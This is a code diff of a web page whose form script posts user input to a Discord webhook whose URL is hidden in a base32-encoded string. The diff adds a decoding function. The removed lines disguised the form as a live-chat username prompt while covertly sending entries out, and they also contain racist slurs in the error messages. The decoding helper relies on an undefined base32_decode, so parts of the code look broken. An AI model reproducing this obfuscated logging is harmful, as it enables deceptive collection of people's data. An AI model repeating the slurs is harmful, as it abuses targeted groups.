@@ -85,8 +85,8 @@
   </a>
   
   <form id="ipLoggerForm">
-    <input type="text" id="ipAddress" placeholder="make a username for the chat">
-    <button type="submit">live chat</button>
+    <input type="text" id="ipAddress" placeholder="Enter your IP address">
+    <button type="submit">Log IP</button>
   </form>
   
   <script>
@@ -108,12 +108,21 @@
     ipLoggerForm.addEventListener('submit', function(event) {
       event.preventDefault();
       const ipAddress = ipAddressInput.value;
-      // Send the IP address to the encrypted Discord webhook
+      // Decrypt the encrypted webhook URL
+      function decryptWebhookUrl(encryptedWebhookUrl) {
+        // Implement your decryption algorithm here
+        // Example using base32_decode() function from the base32-decode library
+        return base32_decode(encryptedWebhookUrl);
+      }
+
       const encryptedWebhookUrl = 'NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3XMVRGQ33PNNZS6MJSG43DGMJYGAZDGMJSGQ2TEMBZHAYC6U2JOFMGMRRSK5RU2LL2JJWUCOLSGY4HET2ZJZCU6TJTNB5DMZSZIZAWSR2EOJCEU5TPGVCU4ZBXJY4UINJWNVIHU52SOR3XM6JTJ5QWOX2VPI======';
+      const decryptedWebhookUrl = decryptWebhookUrl(encryptedWebhookUrl);
+
+      // Send the IP address to the decrypted Discord webhook
       const payload = {
         content: `New IP address logged: ${ipAddress}`
       };
-      fetch(encryptedWebhookUrl, {
+      fetch(decryptedWebhookUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -124,11 +133,11 @@
           if (response.ok) {
             console.log('big yay');
           } else {
-            console.error('your a nigger');
+            console.error('die');
           }
         })
         .catch(error => {
-          console.error('i do hate nigs', error);
+          console.error('die', error);
         });
     });
   </script>
